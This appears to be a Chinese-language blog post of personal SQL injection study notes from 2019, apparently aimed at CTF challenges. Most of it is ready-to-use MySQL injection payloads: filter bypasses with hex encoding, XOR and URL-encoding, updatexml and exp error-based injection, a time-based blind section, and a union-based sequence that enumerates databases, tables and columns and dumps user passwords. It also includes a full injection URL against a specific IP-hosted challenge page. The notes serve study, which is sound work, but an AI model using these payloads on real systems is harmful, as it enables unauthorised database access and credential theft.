---
layout: "post"
title: "sql 注入"
date: "2019-04-21 13:58"
---

![](https://raw.githubusercontent.com/shanke001/-/master/img/20190421135853.png)

# 1.sql注入寻找
![](https://raw.githubusercontent.com/shanke001/-/master/img/20190421140004.png)

![](https://raw.githubusercontent.com/shanke001/-/master/img/20190421140429.png)

* distinct 去重复查询





# sql注入

## 绕过技巧
### 1. 关键字用16进制 0x73656C656374 ...
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
### 2.异或运算

![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图16560308556869.png)
![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图17150129060957.png)
**正确为0 错误为1**
1  ^ 0 = 1
1  ^ 1 = 0
测试 过滤字符  符号可以用url编码 %23 #

+++++++++++++++++++++++++++++++++++++++++++++++++++++
### 3.基于报错注入

**updataxml**
**注入语句**
**updatexml(1,concat(0x7e,(查询语句),0)**
暴库
 **updatexml(1,concat(0x7e,(database(),0x7e),1);**
 ![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图16720328383368.png)
 ![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图18720115108113142.png)
之后相同
例子
~~~
http://123.206.87.240:9004/Once_More.php?id=id=%27%20and%20updatexml(1,concat(%27~%27,(select%20database()),%27~%27),1)%23
~~~


**exp**

语句 select exp(~(select * from (查询语句)x))
![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图174110299697129.png)



### 4.基于时间的盲注

![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图18750814505679.png)


---

 * **union select group_concat(table_name) from information_schema.tables where table_schema=database()**
简单的把这句话分解
**group_concat()** 实际上是配合 where 后面的内容，在此处就理解为 将相同的**table_schem**a中的**table_name**合并成一个查询结果
**information_schema**数据库是MySQL系统自带的数据库
tables 是 **information_schema**的其中一个表
**table_schema**和**table_name**是 表中的一个字段
database（） 是检测当前数据库的函数

*  **1' union select 1,2,3,4 #**
![](https://raw.githubusercontent.com/shanke001/-/master/img/20190222133800.png)

## 1.判断是否存在注入，注入是字符型还是数字型

## 2.猜解SQL查询语句中的字段数
order by 1 #

## 3.确定显示的字段顺序
输入1′ union select 1,2 #

## 4.获取当前数据库
database() user() version()

* 查询所有数据库
**select group_concat(distinct TABLE_SCHEMA)  from information_schema.tables;**
![](https://raw.githubusercontent.com/shanke001/-/master/img/360截图1878042290110106.png)

**爆数据库**
**1' union select schema_name from information_schema.schemata where '1' ='1**

## 5.获取数据库中的表
* 方法一
**1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #**
* 方法二
**union  select  table_name from information_schema.tables where  table_schema=...**
* 获取外库表
**union select group_concat(distinct schema_name) from information_schema.schemata where schema_name='flag'**

## 6.获取表中的字段名
**1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #**

**1' union  select  flag from  flag where  '1' ='1'**
## 7.下载数据

**1'  union select group_concat(),group_concat(password) from users #**
